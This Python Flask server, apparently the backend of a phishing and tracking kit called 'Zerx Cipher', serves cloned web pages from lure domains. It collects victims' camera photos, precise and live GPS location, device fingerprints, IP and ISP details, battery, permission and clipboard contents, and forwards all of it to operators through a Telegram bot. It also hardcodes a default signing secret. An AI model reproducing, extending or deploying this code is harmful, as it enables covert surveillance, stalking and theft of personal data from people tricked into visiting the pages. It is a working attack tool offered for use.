#!/usr/bin/env python3
# server.py — Flask backend for Zerx Cipher v1.6.1
# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store,
#            /api/preview-store, /preview/<slug>,
#            /track, /track-camera, /track-chunk, /health

from flask import Flask, request, jsonify, Response
import hmac, hashlib, time, sqlite3, os, json, base64
from datetime import datetime, timezone

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

LINK_SECRET = os.environ.get("LINK_SECRET", "zE4o-jRvHuJiSbw-bg72aeygBJ-In52YqBj_oV-PuYoYlmrIhf_jhjzThgCmShLt")
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
DIVIDER     = "━━━━━━━━━━━━━━━━"
FOOTER      = "⚡ Developed by: @zerxofficial"

_CLONES = {}
_PREVIEWS = {}
_LAST_EVENT = {}
_CHUNKS = {}

ALLOWED_ORIGINS = {
    "https://best-free-ai-tool.netlify.app",
    "https://best-free-ai-tools.netlify.app",
    "https://subtle-sunburst-1d934f.netlify.app",
}

@app.after_request
def add_cors(resp):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS or origin.endswith(".netlify.app"):
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Max-Age"] = "86400"
    return resp

def _sign(payload: str) -> str:
    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]

def _flag_emoji(cc):
    if not cc or len(cc) != 2:
        return ""
    try:
        return chr(0x1F1E6 + ord(cc[0].upper()) - 65) + chr(0x1F1E6 + ord(cc[1].upper()) - 65)
    except Exception:
        return ""

def _send_telegram_text(chat_id, text, preview=False):
    import requests as rq
    try:
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": not preview},
            timeout=12,
        )
    except Exception as e:
        print(f"telegram text failed: {e}")

def _send_telegram_photo(chat_id, b64_data, caption):
    import requests as rq
    try:
        if "," in b64_data:
            b64_data = b64_data.split(",", 1)[1]
        raw = base64.b64decode(b64_data)
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            files={"photo": ("capture.jpg", raw)},
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
            timeout=20,
        )
    except Exception as e:
        print(f"telegram photo failed: {e}")

def _mark(uid, typ):
    _LAST_EVENT.setdefault(uid, {})[typ] = time.time()

def _recent(uid, typ, window=30):
    last = _LAST_EVENT.get(uid, {})
    return last.get(typ) and (time.time() - last[typ]) < window

# ============================================================
# VERIFY
# ============================================================
@app.route("/api/verify", methods=["GET", "OPTIONS"])
def api_verify():
    if request.method == "OPTIONS":
        return ("", 204)
    uid_s = request.args.get("id", "")
    tok   = request.args.get("t", "")
    if not uid_s.isdigit() or not tok:
        return jsonify({"ok": False, "reason": "missing"}), 403
    uid = int(uid_s)
    try:
        exp_s, sig = tok.split(".", 1)
        exp = int(exp_s)
    except Exception:
        return jsonify({"ok": False, "reason": "malformed"}), 403
    if exp < int(time.time()):
        return jsonify({"ok": False, "reason": "expired"}), 403
    expected = _sign(f"{uid}.{exp}")
    if not hmac.compare_digest(expected, sig):
        return jsonify({"ok": False, "reason": "bad_signature"}), 403
    return jsonify({"ok": True, "uid": uid})

# ============================================================
# CLONE STORE
# ============================================================
@app.route("/api/clone-store", methods=["POST"])
def clone_store():
    try:
        data = request.get_json(force=True) or {}
        slug = data.get("slug", "")
        html = data.get("html", "")
        if not slug or not html:
            return jsonify({"ok": False}), 400
        _CLONES[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS clone_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO clone_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/clone/<slug>", methods=["GET"])
def api_clone(slug):
    html = _CLONES.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return "Not found", 404

# ============================================================
# PREVIEW STORE
# ============================================================
@app.route("/api/preview-store", methods=["POST", "OPTIONS"])
def preview_store():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
        slug = (data.get("slug") or "").strip()
        html = data.get("html") or ""
        if not slug or not html:
            return jsonify({"ok": False, "error": "missing slug or html"}), 400
        _PREVIEWS[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS preview_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO preview_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True, "slug": slug}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/preview/<slug>", methods=["GET"])
def preview_view(slug):
    html = _PREVIEWS.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM preview_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return Response(
        "<!doctype html><meta charset='utf-8'><title>Not found</title>"
        "<body style='font:14px -apple-system,Segoe UI,sans-serif;background:#0e0e11;"
        "color:#eee;display:flex;align-items:center;justify-content:center;"
        "height:100vh;margin:0'><div>Preview not found or expired.</div></body>",
        status=404, mimetype="text/html; charset=utf-8"
    )

# ============================================================
# TRACK — Enhanced with map preview
# ============================================================
@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    payload = data.get("data", {}) or {}
    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")

    # ── CAMERA (per-camera dedup) ──
    if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
        cam_label = payload.get("camera", "unknown")
        dedup_key = f"camera_{cam_label}"
        if _recent(uid, dedup_key, 5):
            return jsonify({"ok": True, "dup": True}), 200
        caption = (
            f"📸 <b>Camera Capture</b>\n"
            f"{DIVIDER}\n"
            f"📷 Camera: <b>{cam_label}</b>\n"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_photo(uid, payload["image"], caption)
        _mark(uid, dedup_key)
        return jsonify({"ok": True}), 200

    # ── PRECISE LOCATION (GPS + reverse geocoding + map preview) ──
    if typ == "precise_location" and isinstance(payload, dict):
        if _recent(uid, "precise_location", 30):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        display = payload.get("display", "")
        road = payload.get("road", "")
        city = payload.get("city", "")
        state = payload.get("state", "")
        postcode = payload.get("postcode", "")
        country = payload.get("country", "")
        maps_url = payload.get("mapsUrl") or f"https://maps.google.com/?q={lat},{lon}"
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        addr_parts = [p for p in [road, city, state, postcode, country] if p]
        addr_line = ", ".join(addr_parts) if addr_parts else "N/A"
        text = (
            f"📍 <b>Precise GPS Location</b>\n"
            f"{DIVIDER}\n"
            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
            f"🏠 Address: {addr_line}\n"
            f"🗺 Full: {display}\n\n"
            f"{maps_url}\n"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_text(uid, text, preview=True)
        _mark(uid, "precise_location")
        return jsonify({"ok": True}), 200

    # ── LOCATION (skip — precise_location handles all GPS) ──
    if typ == "location":
        return jsonify({"ok": True, "skipped": True}), 200

    # ── LIVE LOCATION UPDATE ──
    if typ == "location_update" and isinstance(payload, dict):
        if _recent(uid, "location_update", 120):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        speed = payload.get("speed", 0)
        maps_url = payload.get("mapsUrl") or f"https://maps.google.com/?q={lat},{lon}"
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        speed_line = f"\n🏃 Speed: {round(speed, 1)} m/s" if speed else ""
        text = (
            f"📡 <b>Live Location Update</b>\n"
            f"{DIVIDER}\n"
            f"🎯 <code>{lat}, {lon}</code>{acc_line}{speed_line}\n\n"
            f"{maps_url}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_text(uid, text, preview=True)
        _mark(uid, "location_update")
        return jsonify({"ok": True}), 200

    # ── HEARTBEAT ──
    if typ == "heartbeat" and isinstance(payload, dict):
        if _recent(uid, "heartbeat", 110):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        vis = payload.get("visible", "unknown")
        maps_url = payload.get("mapsUrl") or f"https://maps.google.com/?q={lat},{lon}"
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        text = (
            f"💓 <b>Heartbeat</b>\n"
            f"{DIVIDER}\n"
            f"📍 <code>{lat}, {lon}</code>{acc_line}\n"
            f"👁 Page: {vis}\n\n"
            f"{maps_url}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_text(uid, text, preview=True)
        _mark(uid, "heartbeat")
        return jsonify({"ok": True}), 200

    # ── DEVICE INFO (no location — GPS comes from precise_location) ──
    if typ == "device_info" and isinstance(payload, dict):
        if _recent(uid, "device_info", 60):
            return jsonify({"ok": True, "dup": True}), 200

        ua = payload.get("ua", "n/a")
        platform = payload.get("platform", "n/a")
        lang = payload.get("lang", "n/a")
        langs = payload.get("langs", "n/a")
        screen_res = payload.get("screen", "n/a")
        avail = payload.get("avail", "n/a")
        color_depth = payload.get("colorDepth", "n/a")
        pixel_ratio = payload.get("pixelRatio", "n/a")
        tz = payload.get("tz", "n/a")
        cores = payload.get("cores", "n/a")
        mem = payload.get("mem", "n/a")
        touch = payload.get("touch", "n/a")
        touch_points = payload.get("touchPoints", "n/a")
        cookies = payload.get("cookies", "n/a")
        dnt = payload.get("dnt", "n/a")
        url = payload.get("url", "n/a")
        referrer = payload.get("referrer", "none")
        webdriver = payload.get("webdriver", False)
        viewport = payload.get("viewport", "n/a")
        online = payload.get("online", "n/a")

        canvas_fp = payload.get("canvasFp", "n/a")
        webgl_fp = payload.get("webglFp", {})
        if isinstance(webgl_fp, dict):
            webgl_vendor = webgl_fp.get("vendor", "n/a")
            webgl_renderer = webgl_fp.get("renderer", "n/a")
        else:
            webgl_vendor = webgl_renderer = str(webgl_fp)
        audio_fp = payload.get("audioFp", "n/a")
        fonts = payload.get("fonts", [])
        fonts_str = ", ".join(fonts[:15]) if fonts else "none"

        network = payload.get("network") or {}
        net_type = network.get("effectiveType", "n/a") if isinstance(network, dict) else "n/a"
        net_downlink = network.get("downlink", "n/a") if isinstance(network, dict) else "n/a"
        net_rtt = network.get("rtt", "n/a") if isinstance(network, dict) else "n/a"

        ip = payload.get("ip", "?")
        isp = payload.get("isp", "?")
        org = payload.get("org", "?")
        asn = payload.get("asn", "?")
        mobile = payload.get("mobile", "n/a")
        proxy = payload.get("proxy", "n/a")
        hosting = payload.get("hosting", "n/a")

        text = (
            f"📊 <b>Visitor Information Captured</b>\n"
            f"{DIVIDER}\n\n"
            f"🖥️ <b>Device &amp; Browser</b>\n"
            f"   • Platform: {platform}\n"
            f"   • UA: {ua}\n"
            f"   • Language: {lang} ({langs})\n"
            f"   • Viewport: {viewport}\n"
            f"   • Online: {online}\n"
            f"   • Webdriver: {webdriver}\n\n"
            f"🔒 <b>Device Fingerprint</b>\n"
            f"   • Canvas: <code>{canvas_fp}</code>\n"
            f"   • WebGL: {webgl_vendor} / {webgl_renderer}\n"
            f"   • Audio: <code>{audio_fp}</code>\n"
            f"   • Fonts: {fonts_str}\n\n"
            f"🌐 <b>Network Information</b>\n"
            f"   • IP Address: {ip}\n"
            f"   • ISP: {isp}\n"
            f"   • Organization: {org}\n"
            f"   • ASN: {asn}\n"
            f"   • Connection: {net_type}\n"
            f"   • Downlink: {net_downlink}\n"
            f"   • RTT: {net_rtt}\n"
            f"   • Mobile: {mobile}\n"
            f"   • Proxy: {proxy}\n"
            f"   • Hosting: {hosting}\n\n"
            f"🖼️ <b>Display</b>\n"
            f"   • Resolution: {screen_res}\n"
            f"   • Available: {avail}\n"
            f"   • Color Depth: {color_depth}\n"
            f"   • Pixel Ratio: {pixel_ratio}\n"
            f"   • Touch: {touch} ({touch_points} pts)\n\n"
            f"💾 <b>Hardware</b>\n"
            f"   • CPU Cores: {cores}\n"
            f"   • RAM: {mem} GB\n"
            f"   • Timezone: {tz}\n\n"
            f"⚙️ <b>Other</b>\n"
            f"   • Cookies: {cookies}\n"
            f"   • DNT: {dnt}\n"
            f"   • Referrer: {referrer}\n"
            f"   • Page URL: {url}\n\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "device_info")
        return jsonify({"ok": True}), 200

    # ── BATTERY ──
    if typ == "battery" and isinstance(payload, dict):
        if _recent(uid, "battery", 300):
            return jsonify({"ok": True, "dup": True}), 200
        level = payload.get("level", "n/a")
        charging = payload.get("charging", "n/a")
        text = (
            f"🔋 <b>Battery Information</b>\n"
            f"{DIVIDER}\n"
            f"   • Level: {level}\n"
            f"   • Charging: {charging}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "battery")
        return jsonify({"ok": True}), 200

    # ── MEDIA DEVICES ──
    if typ == "media_devices" and isinstance(payload, list):
        if _recent(uid, "media_devices", 300):
            return jsonify({"ok": True, "dup": True}), 200
        lines = [f"   • {d.get('kind','?')}: {d.get('label','(unlabeled)')}" for d in payload]
        text = (
            f"📱 <b>Media Devices</b>\n"
            f"{DIVIDER}\n"
            f"{'chr(10).join(lines)}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "media_devices")
        return jsonify({"ok": True}), 200

    # ── PERMISSIONS ──
    if typ == "permissions" and isinstance(payload, dict):
        if _recent(uid, "permissions", 300):
            return jsonify({"ok": True, "dup": True}), 200
        lines = [f"   • {k}: {v}" for k, v in payload.items()]
        text = (
            f"🔐 <b>Permissions Status</b>\n"
            f"{DIVIDER}\n"
            f"{'chr(10).join(lines)}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "permissions")
        return jsonify({"ok": True}), 200

    # ── STORAGE ──
    if typ == "storage" and isinstance(payload, dict):
        if _recent(uid, "storage", 300):
            return jsonify({"ok": True, "dup": True}), 200
        text = (
            f"💾 <b>Storage Estimate</b>\n"
            f"{DIVIDER}\n"
            f"   • Quota: {payload.get('quota', 'n/a')}\n"
            f"   • Usage: {payload.get('usage', 'n/a')}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "storage")
        return jsonify({"ok": True}), 200

    # ── CLIPBOARD ──
    if typ == "clipboard":
        if _recent(uid, "clipboard", 60):
            return jsonify({"ok": True, "dup": True}), 200
        clip_text = str(payload)[:500] if payload else "(empty)"
        text = (
            f"📋 <b>Clipboard Content</b>\n"
            f"{DIVIDER}\n"
            f"<code>{clip_text}</code>\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "clipboard")
        return jsonify({"ok": True}), 200

    # ── GENERIC FALLBACK ──
    text = (
        f"📡 <b>{typ}</b>\n"
        f"{DIVIDER}\n"
        f"<code>{json.dumps(payload)[:900]}</code>\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n{FOOTER}"
    )
    _send_telegram_text(uid, text)
    return jsonify({"ok": True}), 200

# ============================================================
# TRACK-CAMERA
# ============================================================
@app.route("/track-camera", methods=["POST", "OPTIONS"])
def track_camera():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    uid = str(data.get("uid", "")).strip()
    b64_image = data.get("image", "")
    if not uid.isdigit() or not b64_image:
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200
    if _recent(uid, "track_camera", 5):
        return jsonify({"ok": True, "dup": True}), 200
    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
    caption = f"📸 <b>Camera Capture</b>\n{DIVIDER}\n📅 {now}\n{DIVIDER}\n{FOOTER}"
    _send_telegram_photo(uid, b64_image, caption)
    _mark(uid, "track_camera")
    return jsonify({"ok": True}), 200

# ============================================================
# TRACK-CHUNK
# ============================================================
@app.route("/track-chunk", methods=["POST", "OPTIONS"])
def track_chunk():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    chunk_idx = data.get("chunk", 0)
    total = data.get("total", 1)
    chunk_data = data.get("data", "")
    if not uid.isdigit() or not chunk_data:
        return jsonify({"ok": False}), 400
    chunk_key = f"{uid}_{typ}"
    if chunk_idx == 0:
        _CHUNKS[chunk_key] = {"total": total, "parts": {}}
    if chunk_key not in _CHUNKS:
        _CHUNKS[chunk_key] = {"total": total, "parts": {}}
    _CHUNKS[chunk_key]["parts"][chunk_idx] = chunk_data
    received = len(_CHUNKS[chunk_key]["parts"])
    if received < total:
        return jsonify({"ok": True, "complete": False}), 200
    full_str = ""
    for i in range(total):
        full_str += _CHUNKS[chunk_key]["parts"].get(i, "")
    del _CHUNKS[chunk_key]
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200
    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
    if typ == "camera":
        try:
            payload = json.loads(full_str)
            if isinstance(payload, dict) and payload.get("image"):
                _send_telegram_photo(uid, payload["image"],
                    f"📸 <b>Camera (Chunked)</b>\n{DIVIDER}\n📅 {now}\n{DIVIDER}\n{FOOTER}")
                return jsonify({"ok": True}), 200
        except Exception:
            pass
    text = f"📦 <b>{typ} (reassembled)</b>\n{DIVIDER}\n<code>{full_str[:3500]}</code>\n📅 {now}\n{DIVIDER}\n{FOOTER}"
    _send_telegram_text(uid, text)
    return jsonify({"ok": True}), 200

# ============================================================
# HEALTH
# ============================================================
@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": datetime.now(timezone.utc).isoformat(), "version": "1.6.1"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
